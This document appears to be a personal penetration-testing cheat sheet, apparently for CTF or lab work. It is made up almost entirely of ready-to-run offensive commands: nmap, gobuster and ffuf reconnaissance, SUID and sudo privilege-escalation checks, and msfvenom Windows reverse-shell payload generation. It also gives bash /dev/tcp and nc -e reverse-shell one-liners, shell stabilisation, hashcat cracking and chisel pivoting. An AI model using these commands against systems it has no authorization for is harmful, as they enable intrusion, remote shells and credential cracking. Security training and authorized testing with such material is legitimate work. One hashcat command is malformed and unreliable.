[GTFOBins](https://gtfobins.github.io/), [LinSmartEnum](https://github.com/diego-treitos/linux-smart-enumeration), [LinEnum](https://github.com/rebootuser/LinEnum), [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), [LinuxExploitSuggester](https://github.com/mzet-/linux-exploit-suggester), [suider](https://github.com/etc5had0w/suider)

[Sherlock](https://github.com/rasta-mouse/Sherlock), [impacket](https://github.com/SecureAuthCorp/impacket), [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

----
## scan ports
```bash
# nmap scan allports, service/version info, script scan
nmap -T4 -sC -sV -p- --min-rate=1000 -oN <FILE> <IP> -Pn

# udp scan top 1000 ports
nmap -sU -sC -sV -vvv <IP> -oN nmap/udp-ports

# scan a port for vuln scripts
nmap -p <PORT> -script vuln <IP>

# masscan all tcp ports
massscan -p1-65535 <IP>
```

## scan local network
```bash
nmap -sn 192.168.1.0/24
arp-scan 192.168.1.0/24
```

## find files
```bash
find / -iname <file>.txt 2>/dev/null # linux
dir <file>.txt /S /B # windows cmd
where /r C:\ <file>.txt
Get-ChildItem -Path C:\ -Filter <file>.txt -Recurse -ErrorAction SilentlyContinue -Force # windows powershell
```

## file/directory scan

```bash
gobuster dir -u <IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html --timeout 50s -t 170 -f -o gobsuter

# gobsuter scan php files
gobuster dir -u <IP> -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -t 30 -x php

# gobuster scan directory
gobuster dir -u <IP> -w /usr/share/wordlists/dirb/big.txt -t 30
gobuster dir -u <IP> -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -t 30
gobuster dir -u <IP> -w /usr/share/wordlists/seclists//Discovery/Web-Content/raft-medium-directories.txt --timeout 7s -t 50 -f

# dirsearch
dirsearch -u <IP> -w <wordlist>

# ffuf 
ffuf -u <IP>/FUZZ -w <wordlist>

# ffuf subdomain scan
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://website.com/ -H "Host: FUZZ.website.com" -of html -o scans/ffuf.1.html
```

----
## potential priv-esc
```bash
# list allowed sudo commands
sudo -l

# list files capabilities
getcap -r / 2>/dev/null

# find suid / sgid files
find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
find / -type f -perm -4000 -exec ls -l {} \; 2> /dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls  -l {} \; 2> /dev/null
```

## windows msfvenom payloads
```bash
# windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o payload.exe

# windows reverse shell uses exploit/multi/handler as listener
msfvenom -p windows/shell/reverse_tcp --platform=win --arch=x86 LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe
```

## pentesting smb
```bash
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb

smbmap -H <IP> -u "user -p "pass # give wrong creds
smbclient //<IP>/share

# mount a shared folder
mount -t cifs //x.x.x.x/share /mnt/share
```

## pentesting nfs
```bash
https://vk9-sec.com/2049-tcp-nfs-enumeration/
https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting

# check exposed mounts
showmount -e <IP>
```
## reverse shell
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'

nc -e /bin/bash <IP> <PORT>
```
## services
```bash
# SNMP
snmp-check <IP>
snmpwalk -v1 -c public <IP>

# LDAP
nmap -n -sV --script "ldap* and not brute" <IP>  
```

## etc
```bash
# ssh with public_key
ssh <user>@<server> -i ~/.ssh/id_rsa

# tty shell
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo
fg
enter

# check shared objects 
strace <file> 2>&1

# if sudo su not allowed
sudo -s
sudo -i
sudo /bin/bash
sudo password

# metasploit migrate to diff process
migrate <process_id>

# cracking hash with hashcat
hashcat -a -m 400 hashfile /usr/share/wordlists/rockyou.txt

# reverse port forwading an internal port
chisel server -p 3477 --reverse # local
chisel client <localip:localport> R:8000:127.0.0.1:8000/tcp # remote
```
